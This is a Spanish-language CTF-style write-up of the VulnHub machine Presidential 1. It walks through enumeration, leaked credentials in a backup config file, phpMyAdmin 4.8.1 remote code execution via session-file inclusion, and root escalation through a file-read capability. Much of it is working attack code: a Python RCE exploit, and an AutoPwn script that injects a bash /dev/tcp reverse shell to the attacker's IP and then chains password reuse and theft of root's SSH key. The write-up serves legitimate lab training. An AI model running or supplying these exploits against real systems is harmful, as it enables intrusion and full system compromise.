---
layout: single
title: Presidential 1 - VulnHub
excerpt: "Presidential es una máquina ideal para empezar: toca cosas básicas de pentesting y te obliga a practicar la enumeración web."
date: 2025-11-12
classes: wide
header:
  teaser: /assets/images/vulnHub/presidential_1/casablanca.jpg
  teaser_home_page: true
  icon: /assets/images/vulnhub.svg 
categories:
  - VulnHub
  - Autopwn
  - Scripting 
tags:
  - Web Enumeration
  - Information Leakage
  - Virtual Hosting
  - Abusing phpMyAdmin
  - Pentesting
  - Abusing Capabilities
---

<p align="center">
<img src="/assets/images/vulnHub/presidential_1/casablanca.jpg">
</p>

## Information

- `os`: Linux

- `Difficulty`: Medium

---


Presidential es una máquina ideal para empezar: toca temas básicos de pentesting y te obliga a practicar la enumeración web. Repasas conceptos como virtual hosting y aprendes a encontrar vulnerabilidades aprovechando versiones antiguas de servicios. Además muestra cómo las malas prácticas de los usuarios **por ejemplo la reutilización de credenciales** nos permiten escalar privilegios. Al final se ve claramente que una mala gestión de privilegios puede causar problemas serios.

## Informe Técnico

- [Ver documento PDF](../documentos/Presidential_1.pdf)

---

## Resumen

- Encuentra un archivo con credenciales validas 
- Descubrimiento de virtual hosting
- Explotación de phpMyAdmin
- Abuso de Capabilities

--- 

# Reconociento

En el escaneo por nmap se muestran abierto el puerto 80 y 2082.

```java
Nmap scan report for 192.168.18.47
Host is up (0.00053s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ontario Election Services &raquo; Vote Now!
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 (RSA)
|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 (ECDSA)
|_  256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c (ED25519)
```
Realizando un reconociento de las tecnologias que se encuentran en la pagina web con la herramienta whatweb se descubre el nombre del dominio **votenow.local**.

![](/assets/images/vulnHub/presidential_1/whatweb.png)

## Enumeration

Teniendo el nombre del dominio **votenow.local**, usaremos `gobuster vhost` para buscar posibles subdominios.

![](/assets/images/vulnHub/presidential_1/subdomain.png)

Se identifico el subdominio **datasafe.votenow.local**, ponemos este nombre de dominio y el subdominio en el archivo `/etc/hosts`.

![](/assets/images/vulnHub/presidential_1/virtualhosting.png)

Al ingresar a `http://datasafe.votenow.local` nos encontramos con un panel de autenticacion de **PhpMyAdmin**.

![](/assets/images/vulnHub/presidential_1/PhpMyAdmin.png)

## Explotación

Como no se puede avanzar mas sin las credenciales del PhpMyAdmin, realizamos fuzzing con **gobuster** a la pagina principal para encontrar archivos o ficheros interesantes. 
![](/assets/images/vulnHub/presidential_1/backup.png)

Logramos encontrar un archivo **config.php.bak** que contenia credenciales validas.

![](/assets/images/vulnHub/presidential_1/credentials.png)

Usando las credenciales encontradas en el archivo **config.php.bak** logramos autenticarnos al PhpMyAdmin.

![](/assets/images/vulnHub/presidential_1/phpmyadmindentro.png)

Una vez ingresado al PhpMyAdmin, fue posible identificar la versión actualmente en uso:

![](/assets/images/vulnHub/presidential_1/versionphpmyadmin.png)

La version **4.8.1** de PhpMyAdmin es vulneravle a `RCE`.

![](/assets/images/vulnHub/presidential_1/searchsploit.png)

Script en Python3 para ejecutar código remoto en el servidor.

```python
#!/usr/bin/env python

import re, requests, sys, html

def get_token(content):
  s = re.search('token"\s*value="(.*?)"', content)
  token = html.unescape(s.group(1))
  return token

ipaddr = sys.argv[1]
port = sys.argv[2]
path = sys.argv[3]
username = sys.argv[4]
password = sys.argv[5]
command = sys.argv[6]

url = "http://{}:{}{}".format(ipaddr,port,path)

url1 = url + "/index.php"
r = requests.get(url1)
content = r.content.decode('utf-8')

s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
version = s.group(1)

cookies = r.cookies
token = get_token(content)

p = {'token': token, 'pma_username': username, 'pma_password': password}
r = requests.post(url1, cookies = cookies, data = p)
content = r.content.decode('utf-8')
s = re.search('logged_in:(\w+),', content)
logged_in = s.group(1)

cookies = r.cookies
token = get_token(content)

url2 = url + "/import.php"
payload = '''select '<?php system("{}") ?>';'''.format(command)
p = {'table':'', 'token': token, 'sql_query': payload }
r = requests.post(url2, cookies = cookies, data = p)

session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{}".format(session_id)
r = requests.get(url3, cookies = cookies)

content = r.content.decode('utf-8', errors="replace")
s = re.search("select '(.*?)\n'", content, re.DOTALL)
if s != None:
  print(s.group(1))
```

Le pasamos los parametros necesarios al script y ganamos acceso a la maquina como el usuario **apache**.

![](/assets/images/vulnHub/presidential_1/rce.png)

Mirando en el archivo `/etc/passwd` de la maquina victima, podemor ver que existe un usuario llamado **admin**.

![](/assets/images/vulnHub/presidential_1/user_passwd.png)


## Escalada de privilegios

En la base de datos de PhpMyAdmin encontramos las credenciales del usuario admin, pero su contraseña esta hasheada.

![](/assets/images/vulnHub/presidential_1/phpMyAdmin_credentials.png)

Utilizamos la herramienta `John` para realizar fuerza bruta con el diccionario rockyou.txt

![](/assets/images/vulnHub/presidential_1/credentials_admin.png)

Al probar la contraseña **Stella** nos pudimos autenticar en el sistema, lo que confirma que hay reutilización de credenciales.

![](/assets/images/vulnHub/presidential_1/user_pivoting.png)

Analizando de forma recursiva las Capabilities del sistema, encontramos que el binario `tarS` tiene la capacidad `cap dac read search+ep`

![](/assets/images/vulnHub/presidential_1/capabilities.png)

Esta capacidad permite que dicho binario omita las comprobaciones de permisos de lectura sobre archivos y directorios.
En este caso como tiene habilitado el SSH nos intereza obtener la `id_rsa` del usuario root.  

![](/assets/images/vulnHub/presidential_1/tarS.png)

Teniendo la `id_rsa` podemos obtener una shell como el usuario root 

![](/assets/images/vulnHub/presidential_1/root.png)

--- 

## AutoPwn

Script en Python3

```python 
#!/usr/bin/env python3

# Author: Kysk3

import requests, time, sys, signal, threading, re, pdb 
from pwn import *
from termcolor import colored

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

#Compronar parametros
if len(sys.argv) != 3:
    print(colored(f"\nUso: python3 {sys.argv[0]} <ip-target> <tu-ip>\n", 'green'))
    sys.exit(1)

ip_target = sys.argv[1]
ip_attack = sys.argv[2]

p1 = log.progress("Iniciando reconocimiento")

# comprobar privilegios
if os.geteuid() != 0:
    print(colored("\nEste script necesita permisos de superusuario. Ejecuta con sudo.\n", 'red'))
    sys.exit(1)

def virtual_host():

    p1.status("Agregando dominios al /etc/hosts")

    with open("/etc/hosts", "a", encoding="utf-8") as f:
        f.write(f"{ip_target} votenow.local datasafe.votenow.local")
    time.sleep(2)

def credentials_db():
    
    global db_user, db_passwd
    
    p1.status("Obteniendo credenciales")

    url_credentials = f"http://{ip_target}/config.php.bak"
    r = requests.get(url_credentials)
    db_user = re.findall(r'dbUser = "(.*?)"', r.text)[0]
    db_passwd = re.findall(r'dbPass = "(.*?)"', r.text)[0]
    
    time.sleep(2)

def session_PhpPyAdmin():
    
    p2 = log.progress("Iniciando Ataque en PhpMyAdmin")
    p2.status("Autenticación en PhpMyAdmin")

    url_PhpMyAdmin = "http://datasafe.votenow.local/index.php"

    s = requests.session()
    r = s.get(url_PhpMyAdmin)

    post_data = {
            'set_session': re.findall(r'name="set_session" value="(.*?)"', r.text)[0],
            'pma_username': f"{db_user}",
            'pma_password': f"{db_passwd}",
            'server': '1',
            'target': 'index.php',
            'token': re.findall(r'name="token" value="(.*?)"', r.text)[0]
            }
    
    r = s.post(url_PhpMyAdmin, data=post_data)
    
    time.sleep(2)


    cookies = s.cookies
    token = str(re.findall(r'name="token" value="(.*?)"', r.text)[0])
    
    #Creando el payload
    p2.status("Creando payload")

    command = "bash -c 'bash -i >& /dev/tcp/{}/443 0>&1'".format(ip_attack)
    url_shell = "http://datasafe.votenow.local/import.php"
    payload = '''select '<?php system("{}"); ?>';'''.format(command)

    p = {'table':'', 'token': token, 'sql_query': payload }

    r = s.post(url_shell, cookies = cookies, data = p)
    if r.status_code != 200:
        print("Query failed")
        sys.exit(1)
    
    time.sleep(2)

    ## LFI -> RCE
    p2.status("LFI -> RCE")

    session_id = cookies.get_dict()['phpMyAdmin']
    url_lfi = "http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{}".format(session_id)
    
    r = s.get(url_lfi, cookies = cookies)
    if r.status_code != 200:
        print("Exploit failed")
        sys.exit(1)

    time.sleep(2)

if __name__ == '__main__':

    virtual_host()
    credentials_db()
    time.sleep(2)

    try:
        threading.Thread(target=session_PhpPyAdmin, args=()).start()
    except Exception as e:
        log.error(str(e))
    
    shell = listen(443, timeout=20).wait_for_connection()
    

    if shell.sock is None:
        log.failure("No se ha obtenido ninguna conexión")
        sys.exit(1)
    else:
        log.success("Se ha obtenido una conexión")
        time.sleep(1)
        log.info("Acceso al sistema como usuario apache")
        time.sleep(1)

    p3 = log.progress("Escalación de privilegios")
    p3.status("Iniciando como el usuario admin")
    time.sleep(1)

    #shell.sendline(b"script /dev/null -c bash")
    shell.sendline("su admin".encode())
    shell.recvuntil("Password:".encode())
    shell.sendline("Stella".encode())
    
    p3.status("Obteniendo shell como root")
    time.sleep(1)

    shell.sendline(b"cd")
    shell.sendline(b"tarS -cf comprimido.tar /root/.ssh &>/dev/null")
    shell.sendline(b"tarS -xf comprimido.tar &>/dev/null")
    shell.sendline(b"ssh -i root/.ssh/id_rsa root@localhost -p 2082")
    p3.success("Pwned!!")
    shell.interactive()
```

## Ejecución del AutoPwn
<br>
![](/assets/images/vulnHub/presidential_1/AutoPwn.png)












